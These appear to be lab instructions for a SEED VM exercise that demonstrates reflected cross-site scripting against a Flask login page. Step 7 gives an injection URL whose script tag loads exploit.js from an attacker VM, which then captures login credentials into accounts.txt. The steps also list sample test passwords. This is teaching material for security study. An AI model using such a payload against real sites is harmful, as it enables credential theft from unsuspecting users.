1. Create SEED VM and add it to a NAT Network in Virtual Box.

2. Run the following commands to install dependencies:
sudo pip install --upgrade pip
sudo pip install Flask
sudo pip install Flask-SQLAlchemy
sudo pip install Flask-Session
sudo pip install -U flask-cors

3. Shut down VM, then Clone 2 times (we need total of 3 VMs).

4. Add all VMs to same NAT Network and make sure they are able to ping each other.
Check IPs with ifconfig.

5. Extract attacker and server folders to unique VMs, note each VM's IP address.

6. On server VM, generate user db by running script:
python3 create_user_db.py

7. Fill in the following URL with correct IPs:
http://*SERVER*/login?status=<script type="text/javascript" src="http://*ATTACKER*/static/js/exploit.js"></script>

Example:
Server  : 10.0.2.5:5000
Attacker: 10.0.2.6:5000
http://10.0.2.5:5000/login?status=<script type="text/javascript" src="http://10.0.2.6:5000/static/js/exploit.js"></script>

8. Run Flask on server and attacker VMs by navigating to folders extracted earlier and running commands:
export FLASK_APP=server.py
flask run --host=0.0.0.0

9. Visit server from client VM (the one not running Flask server).
Go through steps of logging in with one of these accounts:
admin:password
john:feb123

10. Visit url from step 6 to showcase exploited login page. Attempt to login unsuccessfully, and then successfully.

11. After successful login, navigate to folder on attacker VM and verify accounts.txt was created and accounts are visible.
